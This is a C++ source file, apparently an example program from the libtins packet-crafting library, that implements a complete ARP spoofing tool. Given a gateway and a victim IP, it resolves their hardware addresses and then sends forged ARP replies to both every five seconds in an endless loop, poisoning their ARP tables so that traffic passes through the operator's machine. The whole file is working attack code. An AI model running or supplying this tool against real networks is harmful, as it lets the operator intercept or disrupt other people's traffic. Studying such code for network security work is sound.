/*
 * libtins is a net packet wrapper library for crafting and
 * interpreting sniffed packets.
 *
 * Copyright (C) 2011 Nasel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 */


#include <iostream>
#include <string>
#include <stdint.h>
#include <cstdlib>
#include <tins/arp.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>

using namespace std;
using namespace Tins;


int do_arp_spoofing(uint32_t iface, const string &iface_name, uint32_t gw, uint32_t victim, uint32_t own_ip, uint8_t *own_hw) {
    PacketSender sender;
    uint8_t gw_hw[6], victim_hw[6];
    
    // Resolves gateway's hardware address.
    if(!Utils::resolve_hwaddr(iface_name, gw, gw_hw, &sender)) {
        cout << "Could not resolve gateway's ip address.\n";
        return 5;
    }
    
    // Resolves victim's hardware address.
    if(!Utils::resolve_hwaddr(iface_name, victim, victim_hw, &sender)) {
        cout << "Could not resolve victim's ip address.\n";
        return 6;
    }
    // Print out the hw addresses we're using.
    cout << " Using gateway hw address: " << Utils::hwaddr_to_string(gw_hw) << "\n";
    cout << " Using victim hw address:  " << Utils::hwaddr_to_string(victim_hw) << "\n";
    cout << " Using own hw address:     " << Utils::hwaddr_to_string(own_hw) << "\n";
    
    /* We tell the gateway that the victim is at out hw address,
     * and tell the victim that the gateway is at out hw address */
    ARP *gw_arp     = new ARP(gw, victim, gw_hw, own_hw), 
        *victim_arp = new ARP(victim, gw, victim_hw, own_hw);
    // We are "replying" ARP requests
    gw_arp->opcode(ARP::REPLY);
    victim_arp->opcode(ARP::REPLY);
    
    /* The packet we'll send to the gateway and victim. 
     * We include our hw address as the source address
     * in ethernet layer, to avoid possible packet dropping
     * performed by any routers. */
    EthernetII to_gw(iface, gw_hw, own_hw, gw_arp);
    EthernetII to_victim(iface, victim_hw, own_hw, victim_arp);
    while(true) {
        // Just send them once every 5 seconds.
        if(!sender.send(&to_gw) || !sender.send(&to_victim))
            return 7;
        sleep(5);
    }
}

int main(int argc, char *argv[]) {
    if(argc != 3 && cout << "Usage: " << *argv << " <Gateway> <Victim>\n")
        return 1;
    uint32_t gw, victim, own_ip;
    uint8_t own_hw[6];
    try {
        // Convert dotted-notation ip addresses to integer. 
        gw     = Utils::ip_to_int(argv[1]);
        victim = Utils::ip_to_int(argv[2]);
    }
    catch(...) {
        cout << "Invalid ip found...\n";
        return 2;
    }
    
    // Get the interface which will be the gateway for our requests.
    string iface = Utils::interface_from_ip(gw);
    cout << iface << "\n";
    uint32_t iface_index;
    // Lookup the interface id. This will be required while forging packets.
    if(!Utils::interface_id(iface, iface_index) && cout << "Interface " << iface << " does not exist!\n")
        return 3;
    // Find the interface hardware and ip address.
    if(!Utils::interface_hwaddr(iface, own_hw) || !Utils::interface_ip(iface, own_ip)) {
        cout << "Error fetching addresses from " << iface << "\n";
        return 4;
    }
    // Poison ARP tables :D
    return do_arp_spoofing(iface_index, iface, gw, victim, own_ip, own_hw);
}

